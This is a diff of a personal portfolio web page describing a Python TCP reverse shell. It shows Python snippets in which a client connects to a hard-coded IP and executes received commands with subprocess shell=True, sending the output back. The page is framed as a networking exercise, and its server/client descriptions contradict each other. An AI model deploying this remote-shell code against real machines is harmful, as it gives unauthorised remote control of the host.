@@ -1,50 +1,147 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>Gurumanie Singh | ReverseShell</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ReverseShell | Gurumanie Singh</title>
 
+  <!-- Override Tailwind’s gray palette -->
   <script>
-    window.tailwind = window.tailwind||{};
-    window.tailwind.config={ theme:{extend:{colors:{gray:{
-      900:'#1b1b1b',800:'#2d2d2d',700:'#3f3f3f',600:'#525252',
-      500:'#6b6b6b',400:'#8a8a8a',300:'#a8a8a8',200:'#c7c7c7',100:'#e1e1e1'
-    }}}}};
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            gray: {
+              900: '#1b1b1b',
+              800: '#2d2d2d',
+              700: '#3f3f3f',
+              600: '#525252',
+              500: '#6b6b6b',
+              400: '#8a8a8a',
+              300: '#a8a8a8',
+              200: '#c7c7c7',
+              100: '#e1e1e1'
+            }
+          }
+        }
+      }
+    };
   </script>
+
+  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet"/>
-  <link rel="stylesheet" href="../../css/styles.css"/>
+
+  <!-- Inter Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&display=swap" rel="stylesheet" />
+
+  <!-- AOS CSS -->
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet" />
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="../../css/styles.css" />
 </head>
-<body class="font-sans" style="background:linear-gradient(180deg,#1b1b1b,#2d2d2d);color:#e1e1e1;font-family:'Less Sans Minimal',sans-serif;">
+<body class="font-sans transition-all" style="background: linear-gradient(180deg, #1b1b1b, #2d2d2d); color: #e1e1e1; font-family: 'Less Sans Minimal', sans-serif;">
 
   <!-- Header -->
   <header class="w-full p-6 bg-gray-900 sticky top-0 flex justify-between items-center z-50">
     <h1 class="text-2xl font-semibold text-white">ReverseShell</h1>
-    <nav><a href="../index.html" class="text-gray-100 hover:text-white">← Back</a></nav>
+    <a href="../index.html" class="text-gray-100 hover:underline">← Back</a>
   </header>
 
-  <section class="py-16 px-4 max-w-3xl mx-auto" data-aos="fade-up">
-    <h2 class="text-3xl font-semibold mb-4 text-white">TCP Reverse Shell Utility</h2>
-    <p class="text-gray-200 mb-4">
-      <strong>server.py</strong> listens for incoming connections, then launches an interactive shell over the TCP socket:
-      <ul class="list-disc list-inside mt-2 text-gray-200">
-        <li>Uses <code>subprocess.Popen</code> to spawn a shell process.</li>
-        <li>Redirects stdin/stdout/stderr to the socket for remote command execution.</li>
+  <main class="max-w-2xl mx-auto py-12 px-4" data-aos="fade-up">
+
+    <!-- Overview -->
+    <section class="mb-8">
+      <h2 class="text-3xl font-medium mb-4 text-white">Project Overview</h2>
+      <p class="text-lg text-gray-200">
+        Implements a TCP-based reverse shell allowing remote command execution on the client's machine, illustrating raw socket handling, subprocess control, and directory navigation.
+      </p>
+    </section>
+
+    <!-- Server Implementation -->
+    <section class="mb-8">
+      <h3 class="text-2xl font-semibold mb-2 text-white">Server Implementation</h3>
+      <p class="mb-2 text-gray-200">
+        The server sets up a listener socket:
+      </p>
+      <pre class="bg-gray-800 p-4 rounded-md overflow-x-auto text-gray-100"><code>def createSocket():
+    global s, host, port
+    host = ''
+    port = 9999
+    s = socket.socket()
+</code></pre>
+      <p class="mt-2 text-gray-200">
+        After binding and listening, it accepts incoming clients and forwards them to <code>socketAccept()</code> for command dispatch.
+      </p>
+      <p class="mb-2 text-gray-200">
+        Once connected, it waits for commands from the client:
+      </p>
+      <pre class="bg-gray-800 p-4 rounded-md overflow-x-auto text-gray-100"><code>data = s.recv(1024)
+if data[:2].decode() == 'cd':
+    os.chdir(data[3:].decode())
+if len(data) > 0:
+    cmd = subprocess.Popen(data.decode(), shell=True,
+                           stdout=subprocess.PIPE,
+                           stdin=subprocess.PIPE,
+                           stderr=subprocess.PIPE)
+    output = cmd.stdout.read() + cmd.stderr.read()
+    s.send(str.encode(output.decode() + os.getcwd() + '> '))
+</code></pre>
+      <p class="mt-2 text-gray-200">
+        Commands are executed via <code>subprocess.Popen</code>, and combined stdout/stderr is sent back along with the updated working directory.
+      </p>
+    </section>
+
+    <!-- Client Implementation -->
+    <section class="mb-8">
+      <h3 class="text-2xl font-semibold mb-2 text-white">Client Implementation</h3>
+      <p class="mb-2 text-gray-200">
+        The client initiates the reverse connection:
+      </p>
+      <pre class="bg-gray-800 p-4 rounded-md overflow-x-auto text-gray-100"><code>s = socket.socket()
+host = '10.48.64.73'
+port = 9999
+s.connect((host, port))
+</code></pre>
+      <p class="mt-2 text-gray-200">
+        It enters a loop receiving commands from the server and executing them locally:
+      </p>
+      <pre class="bg-gray-800 p-4 rounded-md overflow-x-auto text-gray-100"><code>while True:
+    data = s.recv(1024)
+    if data[:2].decode() == 'cd':
+        os.chdir(data[3:].decode())
+    if data:
+        proc = subprocess.Popen(data.decode(), shell=True,
+                                stdout=subprocess.PIPE,
+                                stdin=subprocess.PIPE,
+                                stderr=subprocess.PIPE)
+        out = proc.stdout.read() + proc.stderr.read()
+        s.send(str.encode(out.decode() + os.getcwd() + '> '))
+        print(out.decode(), end='')
+</code></pre>
+    </section>
+
+    <!-- Key Takeaways -->
+    <section>
+      <h3 class="text-2xl font-semibold mb-2 text-white">Key Takeaways</h3>
+      <ul class="list-disc list-inside ml-4 text-gray-200">
+        <li>Bi-directional command/control over raw TCP sockets.</li>
+        <li>Subprocess management for remote shell execution.</li>
+        <li>Dynamic working directory handling via remote <code>cd</code> commands.</li>
       </ul>
-    </p>
-    <p class="text-gray-200 mb-6">
-      <strong>client.py</strong> connects and spawns a background thread to continuously read server responses, forwarding user keystrokes to execute commands remotely.
-    </p>
-    <div class="text-center">
+    </section>
+
+    <!-- View Code Button -->
+    <div class="text-center mt-8">
       <a href="https://github.com/gurumanie-singh/gurumanie-singh.github.io/tree/main/py-network-experiments/ReverseShell"
-         class="inline-block border border-gray-100 px-6 py-3 rounded-full text-gray-100 hover:bg-gray-700">
-        View Full Code
+         class="inline-block border border-gray-100 px-6 py-3 rounded-full text-gray-100 hover:bg-gray-700 transition">
+        View Full Code on GitHub
       </a>
     </div>
-  </section>
+
+  </main>
 
   <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-  <script>AOS.init({ duration:800, once:true });</script>
+  <script> AOS.init({ duration: 800, once: true }); </script>
 </body>
 </html>
